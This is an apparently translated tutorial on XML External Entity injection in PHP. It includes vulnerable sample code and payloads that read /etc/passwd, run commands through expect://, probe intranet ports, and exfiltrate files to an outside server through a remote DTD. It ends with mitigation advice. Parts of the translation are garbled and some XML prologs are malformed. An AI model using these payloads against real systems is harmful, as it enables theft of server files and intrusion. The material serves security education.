# PHP Security Learningâ€”XML External Entity Injection Vulnerability

Author: H3rmesk1t

Data: 2021.06.06

# environment
PHP 7.0.30, Libxml 2.8.0 (There is no external entity parsing after Libxml2.9.0, and the PHP version does not affect the utilization of XXE)


# Introduction to Principle

XML is designed to transmit and store data, with a focus on the content of the data, HTML is designed to display data, with a focus on the appearance of the data, HTML is designed to display information, while XML is designed to transmit information
XML features: XML is designed to structure, store and transmit information. It is only plain text. Software that can handle plain text can process XML. XML allows creators to define their own tags and their own document structure. XML is an information transmission tool independent of software and hardware. All modern browsers have built-in XML parser to read and operate XML, but different browsers have different parsing methods. For example, using the loadXML() method in IE and DOMParser in other browsers.
The loadXML() method is used to load string text, the load() method is used to load files, the parser loads XML into memory, and then converts it into an XML DOM object accessible through JavaScript.

# Vulnerability hazards
1. Read any file
file protocol: `file:///etc//passwd`
php protocol: `php://filter/read=convert.base64-encode/resource=index.php`
2. Execute system commands
Some situations will occur. In special configuration environments, if the PHP expect module is loaded into a vulnerable system or an application that can handle XML, you can execute commands. The simple payload is as follows

```php
<?xml version="1.0" encoding="utf-8"?
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "expect://ifconfig" >]>
<root>
<name>&xxe;</name>
</root>
```
3. Detect the intranet port
With the help of vulnerabilities, the common payload is as follows

```php
<?xml version="1.0" encoding="utf-8"?
<!DOCTYPE xxe [
<!ELEMENT name ANY>
<!ENTITY xxe SYSTEM "http://192.168.199.100:80">]>
<root>
<name>&xxe;</name>
</root>
```
4. Attacking the intranet website (dos or directly eating server resources leads to inability to serve normally)

# example
## There is an echo
- Source code
```php
<?php
$data = file_get_contents('php://input');
$xml = simplexml_load_string($data);

echo $xml->name;
```
- Payload

```php
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210606143625390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## No retouch
> XXE without echo must use external server to bring out the echo content. This kind of XXE is also called blind XXE
- Source code

```php
<?php
$data = file_get_contents('php://input');

$dom = new DOMDocument();
$dom->loadXML($data);
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210606143812772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

If it is executed directly, there is no echo. You can use the http protocol to send the request to the remote server to obtain the file contents
First write a dtd file on the remote server, such as test.dtd, and the file content is as follows

```php
Note: The % number requires the entity hexadecimal code to %
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY % send SYSTEM 'http://192.168.2.1/%file;'>">
```

Take data to the server with Payload

```php
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://192.168.2.1/test.dtd">
%remote;%int;%send;
]>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/202106061440463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The execution logic is roughly as follows:
1. From the payload, you can see that three parameter entities %remote;%int;%send; are called in succession. This is our order of use. %remote is called first, and then requests test.dtd on the remote server after calling, which is a bit similar to including test.dtd.
2. %int calls %file in test.dtd, and %file will get the sensitive files on the server.
 3. Fill in the result of %file into %send (because there cannot be % in the value of the entity, convert it into html entity encoding \%).
 4. Call %send; send the data we read to our server in a GET request, which achieves the effect of taking out data and perfectly solves the problem of XXE no echo

# Solutions and suggestions
1. Use the method of disabling external entities provided by the development language

```
PHP:
libxml_disable_entity_loader(true);

JAVA:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

Python:
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

2. Filter the XML data submitted by the user

```
<!DOCTYPE and <!ENTITY, SYSTEM and PUBLIC
```
# Go further to learn XXE

To further learn the relevant knowledge and usage methods of XXE, please refer to the content in this article: [Link address] (https://xz.aliyun.com/t/3357)